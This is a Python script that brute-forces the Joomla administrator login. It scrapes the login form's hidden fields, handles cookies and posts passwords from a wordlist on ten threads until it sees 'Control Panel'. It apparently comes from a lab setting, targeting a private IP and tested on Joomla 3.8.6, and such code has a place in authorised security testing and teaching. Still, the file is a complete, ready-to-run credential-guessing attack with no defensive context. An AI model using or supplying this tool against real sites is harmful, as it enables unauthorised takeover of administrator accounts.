"""
This script brute force attacks Joomla's default administrative login steps.

The following steps will be used to brute force Joomla's administrative login:
    1. Retrieve the login page and accept all cookies that are returned.
    2. Parse out all of the form elements from the HTML.
    3. Set the username and/or password to a guess from a dictionary file.
    4. Send a HTTP POST to the login processing sdcript including all HTML form fields and our stored cookies.
    5. Test to see if we successfully logged into the web application.

Note: Tested using a Joomla 3.8.6 website. The wordlist used is from https://wiki.skullsecurity.org/Passwords.
"""

import urllib.request
import urllib.parse
from http.cookiejar import FileCookieJar
import threading
import queue
import html.parser

# General settings
user_thread   = 10
username      = "admin"
wordlist_file = "cain.txt"
resume        = None

# Target specific settings
target_url  = "http://192.168.1.117/Joomla/administrator/index.php"
target_post = "http://192.168.1.117/Joomla/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Control Panel"


class Bruter(object):
    """
    Brute-force class that handles all of the HTTP requests and manages cookies.
    """
    def __init__(self, username, words):
        """
        Creates Bruter object

        :param username: String to be used as the username
        :param words: Queue populated with words to use as passwords.
        :return:
        """
        self.username   = username
        self.password_q = words
        self.found      = False

        print("Finished setting up for: {}".format(username))

    def run_bruteforce(self):
        # Spin off threads to accomplish the brute force attack.
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        """
        Attempts password attempts until a password is successful or password list is exhausted.

        :return: None
        """
        while not self.password_q.empty() and not self.found:
            # Get next password to try
            brute = self.password_q.get().strip()

            # Setup cookie jar to store the cookies in the cookie file.
            jar    = FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

            # Make target request to retrieve the login form elements.
            response = opener.open(target_url)
            page     = response.read().decode('utf-8')

            print("Trying: {} : {} ({} left)".format(self.username, brute, self.password_q.qsize()))

            # Parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # Replace the username and password fields with our content.
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            # URL encode the POST variables and pass them in our subsequent HTTP request.
            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data.encode('utf-8'))

            # Retrieve the results of the authentication attempt.
            login_result = login_response.read().decode('utf-8')

            # Test if the authentication attempt was successful or not.
            if success_check in login_result:
                self.found = True

                print("[*] Bruteforce successful.")
                print("[*] Username: {}".format(username))
                print("[*] Password: {}".format(brute))
                print("[*] Waiting for other threads to exit...")


class BruteParser(html.parser.HTMLParser):
    """
    HTML parsing class.
    """
    def __init__(self):
        html.parser.HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        """
        Handles the start of an HTML tag (e.g. <div id="main">) to discover "input" tags.

        :param tag: Name of the tag converted to lower case.
        :param attrs: List of (name, value) pairs containing the attributes found inside the tag's <> brackets.
        :return: None.
        """
        if tag == "input":
            tag_name  = None
            tag_value = None

            for name, value in attrs:
                if name == "name":
                    tag_name = value

                if name == "value":
                    tag_value = value

            if tag_name:
                self.tag_results[tag_name] = tag_value


def build_wordlist(wordlist_file):
    """
    Reads in a wordlist file and builds a queue of words contained within the list.

    :param wordlist_file: Filepath of the word list to be used
    :return: Queue full of words from the given word list
    """
    # Read in the word list
    with open(wordlist_file, "r") as fd:
        raw_words = fd.readlines()

    found_resume = False
    words = queue.Queue()

    for word in raw_words:
        word = word.strip()

        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: {}".format(resume))
        else:
            words.put(word)

    return words


if __name__ == "__main__":
    words = build_wordlist(wordlist_file)
    bruter_obj = Bruter(username, words)
    bruter_obj.run_bruteforce()
